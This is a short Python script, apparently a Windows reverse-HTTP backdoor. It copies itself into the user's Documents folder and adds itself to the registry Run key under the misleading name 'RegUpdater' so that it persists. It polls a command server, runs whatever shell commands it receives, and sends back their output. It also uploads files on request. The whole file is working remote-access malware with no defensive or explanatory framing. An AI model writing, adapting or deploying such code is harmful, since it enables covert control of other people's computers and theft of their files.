
# HTTP CLIENT

import requests
import subprocess
import time
import os
import shutil
import winreg

SERVER_URL = "http://127.0.0.1"

path = os.getcwd().strip('\n')

Null, userprof = subprocess.check_output("set USERPROFILE", shell=True).split("=")

destination = userprof.strip("\n\r") + "\\Documents\\" + "http_client.exe"

if not os.path.exists(destination):

    shutil.copyfile(path + "\http_client.exe", destination)

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)

    winreg.SetValueEx(key, "RegUpdater", 0, winreg.REG_SZ, destination)

    key.Close()


while True:

    req = requests.get(SERVER_URL)
    command = req.text

    if "terminate" in command:
        break

    elif "grab" in command:

        grab, path = command.split("*")
        if os.path.exists(path=path):
            url = SERVER_URL + "/store"
            files = {"file": open(path, "r")}
            r = requests.post(url=url, files=files)
        else:
            post_response = requests.post(SERVER_URL, data="[-] Could not find the file")

    else:
        cmd = subprocess.Popen(command, shell=True,
                               stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)

        post_response = requests.post(url=SERVER_URL, data=cmd.stdout.read())
        post_response = requests.post(url=SERVER_URL, data=cmd.stderr.read())

    time.sleep(3)
